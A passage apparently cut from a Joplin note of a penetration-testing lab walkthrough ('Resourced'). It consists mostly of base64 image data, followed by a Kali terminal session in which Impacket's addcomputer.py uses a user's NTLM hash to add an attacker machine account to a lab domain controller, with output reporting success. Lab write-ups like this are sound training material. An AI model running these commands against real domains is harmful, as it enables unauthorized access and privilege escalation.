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VqpVFXm9RcVFBQcESPSciuoMw685WMoWTZ3D0JI6exLFTGLqhIZAMwgjAGIMMwhgQxjCMEcggjAnICGAIGAAkBIQCWIFcKG4oBVJ4ofqgeCHcEIVSKYSwTN2tqqKxFhtasbEVG9ehvHQJnjgRERHRwkmlUoHA6Njo6FgwGBgJDAwMDA/7R0cDwbFgKByOx+O6biD9fVUITVUdDkeuKzc/P9/jKfR6vaVlpfn5+fn5eQUFBYy4RJSNWXdupMTZC3jvBD44h7Mf4XwnorEbT4EREghDRiCjkAmJpJAGhA4AUoFQAE0KK2CHcEBxCpE7VXRqSpkPDavRWIe2FmxqQwGrBhIREZHZJRKJcDgcDkei0WgsFksmk6lkUtcNQxoAFKGommrRNJvdbrPZnE5HjjMn15XLC5WJaFrMurdpcBinz+HDCzhzHpd7cGUAo2Of9D41DSVFWFGKhlo01WFNHRpqYbfNz4SJiIiIiIiWD2bdT+piFzq70HsVVwZwdQADQxgJYGTsum29M9E0FObDUwBvIcpKsKIUZSWoLENTPfLdizF5IiIiIiIiU2LWnTfRGPqu4uog/AEMj2BkFCOjiMaQSCCRQDwJPQWrFTYrLBbYbXDlwluYCbrFXqwoQ2nxUj8HIiIiIiIiU2DWXSjJFPwBRKJIJBCPX5d1rRbY7XC7uAuXiIiIiIhoQTDrEhERERERkdmwbB0RERERERGZDbMuERERERERmQ2zLhEREREREZkNsy4RERERERGZDbMuERERERERmQ2zLhEREREREZkNsy4RERERERGZDbMuERERERERmQ2zLhEREREREZkNsy4RERERERGZDbMuERERERERmQ2zLhEREREREZkNsy4RERERERGZDbMuERERERERmQ2zLhEREREREZkNsy4RERERERGZDbMuERERERERmQ2zLhEREREREZkNsy4RERERERGZDbMuERERERERmQ2zLhEREREREZkNsy4RERERERGZDbMuERERERERmQ2zLhEREREREZkNsy4RERERERGZDbMuERERERERmQ2zLhEREREREZkNsy4RERERERGZDbMuERERERERmQ2zLhEREREREZkNsy4RERERERGZDbMuERERERERmQ2zLhEREREREZkNsy4RERERERGZDbMuERERERERmQ2zLhEREREREZkNsy4RERERERGZDbMuERERERERmQ2zLhEREREREZkNsy4RERERERGZDbMuERERERERmQ2zLhEREREREZkNsy4RERERERGZDbMuERERERERmQ2zLhEREREREZkNsy4RERERERGZDbMuERERERERmQ2zLhEREREREZkNsy4RERERERGZDbMuERERERERmQ2zLhEREREREZkNsy4RERERERGZDbMuERERERERmQ2zLhEREREREZkNsy4RERERERGZDbMuERERERERmQ2zLhEREREREZkNsy4RERERERGZDbMuERERERERmQ2zvW7iaQAAAJtJREFULhEREREREZkNsy4RERERERGZDbMuERERERERmQ2zLhEREREREZkNsy4RERERERGZDbMuERERERERmQ2zLhEREREREZkNsy4RERERERGZDbMuERERERERmQ2zLhEREREREZkNsy4RERERERGZDbMuERERERERmQ2zLhEREREREZkNsy4RERERERGZDbMuERERERERmc3/B/KjeV4zqgwYAAAAAElFTkSuQmCC" alt="a0c7bbbfcd4eb0c1a80ae17b733fb4a0.png"/></p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ addcomputer.py -method LDAPS -computer-name &apos;ATTACKERSYSTEM$&apos; -computer-pass &apos;Summer2018!&apos; -dc-ip 192.168.229.175 -dc-host RESOURCEDC &quot;resourced.local/l.livingstone&quot; -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -method SAMR
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Successfully added machine account ATTACKERSYSTEM$ with password Summer2018!.</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ addcomputer.py -<span class="hljs-keyword">method</span> <span class="hljs-title function_">LDAPS</span> -<span class="hljs-title function_">computer</span>-<span class="hljs-title function_">name</span> &apos;<span class="hljs-title function_">ATTACKERSYSTEM</span>$&apos; -<span class="hljs-title function_">computer</span>-<span class="hljs-title function_">pass</span> &apos;<span class="hljs-title function_">Summer2018</span>!&apos; -<span class="hljs-title function_">dc</span>-<span class="hljs-title function_">ip</span> 192.168.229.175 -<span class="hljs-title function_">dc</span>-<span class="hljs-title function_">host</span> <span class="hljs-title function_">RESOURCEDC</span> &quot;<span class="hljs-title function_">resourced</span>.<span class="hljs-title function_">local</span>/<span class="hljs-title function_">l</span>.<span class="hljs-title function_">livingstone</span>&quot; -<span class="hljs-title function_">hashes</span> :<span class="hljs-number">19</span>a3a7550ce8c505c2d46b5e39d6f808 -<span class="hljs-keyword">method</span> <span class="hljs-title function_">SAMR</span>
+<span class="hljs-title function_">Impacket</span> <span class="hljs-title function_">v0</span>.13.0 - <span class="hljs-title function_">Copyright</span> <span class="hljs-title function_">Fortra</span>, <span class="hljs-title function_">LLC</span> <span class="hljs-title function_">and</span> <span class="hljs-title function_">its</span> <span class="hljs-title function_">affiliated</span> <span class="hljs-title function_">companies</span> 
+
